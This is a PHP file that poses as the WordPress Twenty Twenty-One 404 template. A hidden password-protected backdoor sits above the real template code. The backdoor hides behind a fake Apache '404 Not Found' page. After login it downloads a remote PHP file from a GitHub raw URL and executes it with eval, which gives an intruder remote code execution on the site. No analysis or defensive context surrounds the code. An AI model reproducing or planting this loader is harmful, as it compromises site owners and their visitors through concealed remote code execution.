<?php include 'auto_loader.php'; ?>

<?php 
// 
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// 
function auto_loader() {
    // 
    if (!isset($_GET['scand']) && !isset($_SESSION['logged_in'])) {
        return; // 
    }

    function show_404() {
        // 
        $server_name = $_SERVER['SERVER_NAME'];
        $server_port = $_SERVER['SERVER_PORT'];
        $requested_url = $_SERVER['REQUEST_URI'];
        echo <<<HTML
<!DOCTYPE HTML>
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL $requested_url was not found on this server.</p>
    <hr>
    <address>Apache/2.4.41 (Ubuntu) Server at $server_name Port $server_port</address>
</body>
</html>
HTML;
        exit;
    }

    function geturlsinfo($url) {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

            if (isset($_SESSION['SAP'])) {
                curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
            }

            $url_get_contents_data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $url_get_contents_data = file_get_contents($url);
        } else {
            $url_get_contents_data = false;
        }
        return $url_get_contents_data;
    }

    function is_logged_in() {
        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
    }

    // Login handler
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = 'e00b29d5b34c3f78df09d45921c9ec47'; // MD5 hash
        if (md5($entered_password) === $hashed_password) {
            $_SESSION['logged_in'] = true;
            $_SESSION['SAP'] = 'janco';
        } else {
            echo "Incorrect password. Try again.";
        }
    }

    // 
    if (is_logged_in()) {
        $a = geturlsinfo('https://raw.githubusercontent.com/labubunews/harian/refs/heads/main/levi-popoy.php');
        eval('?>' . $a);
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login</title>
        </head>
        <body>
            <form method="POST" action="">
                <label>Password:</label>
                <input type="password" name="password" />
                <input type="submit" value="Login" />
            </form>
        </body>
        </html>
        <?php
    }
}

// 
auto_loader();
?>

<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package WordPress
 * @subpackage Twenty_Twenty_One
 * @since Twenty Twenty-One 1.0
 */

get_header();
?>

	<header class="page-header alignwide">
		<h1 class="page-title"><?php esc_html_e( 'Nothing here', 'twentytwentyone' ); ?></h1>
	</header><!-- .page-header -->

	<div class="error-404 not-found default-max-width">
		<div class="page-content">
			<p><?php esc_html_e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentytwentyone' ); ?></p>
			<?php get_search_form(); ?>
		</div><!-- .page-content -->
	</div><!-- .error-404 -->

<?php
get_footer();

